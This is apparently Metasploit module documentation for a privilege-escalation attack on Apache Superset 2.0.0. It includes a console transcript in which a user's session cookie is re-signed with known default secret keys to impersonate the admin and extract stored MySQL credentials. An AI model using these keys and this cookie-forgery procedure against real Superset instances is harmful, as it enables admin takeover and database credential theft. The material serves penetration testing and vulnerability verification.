
## Vulnerable Application

Apache Superset versions <= 2.0.0 utilize Flask with a known default secret key which is used to sign HTTP cookies.
These cookies can therefore be forged. If a user is able to login to the site, they can decode the cookie, set their user_id to that
of an administrator, and re-sign the cookie. This valid cookie can then be used to login as the targeted user and retrieve database
credentials saved in Apache Superset.

## App Install

```
sudo docker run -p 8088:8088 -name superset apache/superset:2.0.0
sudo docker exec -it superset superset fab create-admin \
              --username admin \
              --firstname Superset \
              --lastname Admin \
              --email admin@superset.com \
              --password admin

sudo docker exec -it superset superset db upgrade
sudo docker exec -it superset superset init
```

Login to the app, click 'list users' under 'Settings', then click '+'.  make a new user with 'public' as the permission level.

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use auxiliary/gather/apache_superset_priv_esc`
1. Do: `set username [username]`
1. Do: `set password [password]`
1. Do: `run`
1. You should get an admin cookie and the database credentials

## Options

### USERNAME

The username to authenticate as. Required with no default.

### PASSWORD

The password for the specified username. Required with no default.


### ADMIN_ID

The ID of an admin account. Defaults to `1`

## Scenarios

### Superset 2.0.0 Docker image

```
msf6 > use auxiliary/gather/apache_superset_priv_esc 
msf6 auxiliary(gather/apache_superset_priv_esc) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 auxiliary(gather/apache_superset_priv_esc) > set username user
username => user
msf6 auxiliary(gather/apache_superset_priv_esc) > set password user
password => user
msf6 auxiliary(gather/apache_superset_priv_esc) > set verbose true
verbose => true
msf6 auxiliary(gather/apache_superset_priv_esc) > run
[*] Running module against 127.0.0.1

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Apache Supset 2.0.0 is vulnerable
[*] 127.0.0.1:8088 - CSRF Token: ImQ2NDBmM2RlZTcyYjA5MzFiMDE4MjMwYWI4N2QxNzY1NGY0ZTBmZWYi.ZK2qOQ.c-LssFFTxWJKoQZ7v1Sex8q-xy0
[*] 127.0.0.1:8088 - Initial Cookie: session=eyJjc3JmX3Rva2VuIjoiZDY0MGYzZGVlNzJiMDkzMWIwMTgyMzBhYjg3ZDE3NjU0ZjRlMGZlZiIsImxvY2FsZSI6ImVuIn0.ZK2qOQ.oXIWtpT7OItq7Vmr-00Prtl4Pmg;
[*] 127.0.0.1:8088 - Decoded Cookie: {"csrf_token"=>"d640f3dee72b0931b018230ab87d17654f4e0fef", "locale"=>"en"}
[*] 127.0.0.1:8088 - Attempting login
[+] 127.0.0.1:8088 - Logged in Cookie: session=.eJwlj0tqAzEQRO-itRf9G7XalxkkdTc2MTbM2KuQu0chy6Io6r3vsucR561c38cnLmW_e7mWMKE-qmR3UcdB0LB2EczOSC6VeCNBowruSYxjNdswtOnNY3BuuuG0VodSotpMVuzk6AlCDUcqayoYpIu3ZgLAjad1q4xRLmWeR-7v11c8F49XgWSPUBpg6w6wEUMfbdFp3SQlICPX7vGa_RF_Ds-VPmcc_0pUfn4BrnVCHw.ZK2qOQ.SCiqOSW_PTP9VPz2CfG_2IZmHyI;
[*] 127.0.0.1:8088 - Modified cookie: {"_fresh"=>true, "_id"=>"e942ab64fad47d1b20816a441fa312d462352419260ddf231b1fa5b919cd8deb3f5751c986b72f179cf371a2d1df04281bf737f7090fd4d889400383c9a9631e", "csrf_token"=>"d640f3dee72b0931b018230ab87d17654f4e0fef", "locale"=>"en", "user_id"=>1}
[*] Attempting to resign with key: thisismyscretkey\e\y\y\h
[*] 127.0.0.1:8088 - New signed cookie: eyJfZnJlc2giOnRydWUsIl9pZCI6ImU5NDJhYjY0ZmFkNDdkMWIyMDgxNmE0NDFmYTMxMmQ0NjIzNTI0MTkyNjBkZGYyMzFiMWZhNWI5MTljZDhkZWIzZjU3NTFjOTg2YjcyZjE3OWNmMzcxYTJkMWRmMDQyODFiZjczN2Y3MDkwZmQ0ZDg4OTQwMDM4M2M5YTk2MzFlIiwiY3NyZl90b2tlbiI6ImQ2NDBmM2RlZTcyYjA5MzFiMDE4MjMwYWI4N2QxNzY1NGY0ZTBmZWYiLCJsb2NhbGUiOiJlbiIsInVzZXJfaWQiOjF9.ZK2qOQ.fv4N_O6m35thR0PFpOdy7E8MA_Y
[-] 127.0.0.1:8088 - Cookie not accepted
[*] Attempting to resign with key: CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET
[*] 127.0.0.1:8088 - New signed cookie: eyJfZnJlc2giOnRydWUsIl9pZCI6ImU5NDJhYjY0ZmFkNDdkMWIyMDgxNmE0NDFmYTMxMmQ0NjIzNTI0MTkyNjBkZGYyMzFiMWZhNWI5MTljZDhkZWIzZjU3NTFjOTg2YjcyZjE3OWNmMzcxYTJkMWRmMDQyODFiZjczN2Y3MDkwZmQ0ZDg4OTQwMDM4M2M5YTk2MzFlIiwiY3NyZl90b2tlbiI6ImQ2NDBmM2RlZTcyYjA5MzFiMDE4MjMwYWI4N2QxNzY1NGY0ZTBmZWYiLCJsb2NhbGUiOiJlbiIsInVzZXJfaWQiOjF9.ZK2qOQ.XIvqgEv_nviSivPJjE73KOWKMEI
[+] 127.0.0.1:8088 - Cookie validated to user: admin
[+] Found mysql database exampledb: root:my-secret-pw@111.222.3.444:3306
[*] Done enumerating databases
[*] Auxiliary module execution completed
msf6 auxiliary(gather/apache_superset_priv_esc) > creds
Credentials
===========

host           origin         service           public  private       realm  private_type  JtR Format
----           ------         -------           ------  -------       -----  ------------  ----------
111.222.3.444  111.222.3.444  3306/tcp (mysql)  root    my-secret-pw         Password      
```
